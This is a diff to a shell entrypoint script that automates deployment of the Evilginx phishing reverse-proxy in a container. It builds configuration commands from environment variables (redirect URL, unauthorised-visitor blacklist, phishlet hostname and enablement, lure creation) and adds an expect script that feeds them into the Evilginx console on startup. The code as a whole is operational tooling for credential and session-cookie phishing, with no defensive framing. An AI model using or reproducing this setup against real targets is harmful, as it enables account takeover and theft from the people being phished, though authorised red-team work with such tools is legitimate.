@@ -8,12 +8,8 @@ SETUP_SCRIPT="${CONFIG_DIR}/setup.cfg"
 mkdir -p "${LOG_DIR}"
 
 # ---------------------------------------------------
-# Generate a setup.cfg helper file from env vars.
-# NOTE: Evilginx does NOT auto-execute this file — there is no
-# such flag in v3.3.0 (-c/-p/-t/-debug/-developer/-v only).
-# After the container is up, attach and source the commands:
-#     docker attach evilginx
-#     # paste contents of /root/.evilginx/setup.cfg
+# Generate Evilginx REPL commands from env vars.
+# These get fed into the REPL automatically via expect.
 # ---------------------------------------------------
 generate_config() {
     cat > "${SETUP_SCRIPT}" <<EOF
@@ -23,7 +19,6 @@ config redirect_url ${REDIRECT_URL}
 blacklist unauth
 EOF
 
-    # Enable phishlet
     if [ -n "${PHISHLET_NAME}" ] && [ -n "${PHISHLET_HOSTNAME}" ]; then
         cat >> "${SETUP_SCRIPT}" <<EOF
 phishlets hostname ${PHISHLET_NAME} ${PHISHLET_HOSTNAME}
@@ -31,11 +26,8 @@ phishlets enable ${PHISHLET_NAME}
 EOF
     fi
 
-    # Create lure
     if [ -n "${PHISHLET_NAME}" ]; then
-        cat >> "${SETUP_SCRIPT}" <<EOF
-lures create ${PHISHLET_NAME}
-EOF
+        echo "lures create ${PHISHLET_NAME}" >> "${SETUP_SCRIPT}"
         if [ -n "${LURE_REDIRECT_URL}" ]; then
             echo "lures edit 0 redirect_url ${LURE_REDIRECT_URL}" >> "${SETUP_SCRIPT}"
         fi
@@ -85,6 +77,41 @@ mkdir -p "${CONFIG_DIR}/phishlets"
 setup_phishlets
 generate_config
 
-echo "[*] Starting Evilginx..."
-# -p points at the merged dir so Evilginx sees defaults + customs together.
-exec evilginx -p "${CONFIG_DIR}/phishlets" -debug 2>&1 | tee "${LOG_DIR}/evilginx.log"
+echo "[*] Starting Evilginx (auto-applying config from .env)..."
+
+# Use expect to:
+#   1. Spawn evilginx as PID 1
+#   2. Wait for the REPL to be ready (phishlet table border)
+#   3. Feed each line from setup.cfg
+#   4. Hand off to interactive mode (docker attach)
+cat > /tmp/autoconfig.exp <<EXPEOF
+#!/usr/bin/expect -f
+set timeout 120
+
+spawn evilginx -p ${CONFIG_DIR}/phishlets -debug
+
+# Wait for the phishlet status table (last thing before the REPL prompt)
+expect {
+    "+-----" {}
+    timeout { puts "\[!\] Timed out waiting for startup"; exit 1 }
+}
+
+sleep 1
+
+# Feed setup commands from the generated config
+set f [open "${SETUP_SCRIPT}" r]
+while {[gets \$f line] >= 0} {
+    if {\$line ne ""} {
+        send "\$line\r"
+        sleep 1
+    }
+}
+close \$f
+
+puts "\n\[+\] Auto-config applied. REPL is live — attach with: docker attach evilginx"
+
+# Hand control to the operator's terminal (docker attach)
+interact
+EXPEOF
+
+exec expect /tmp/autoconfig.exp
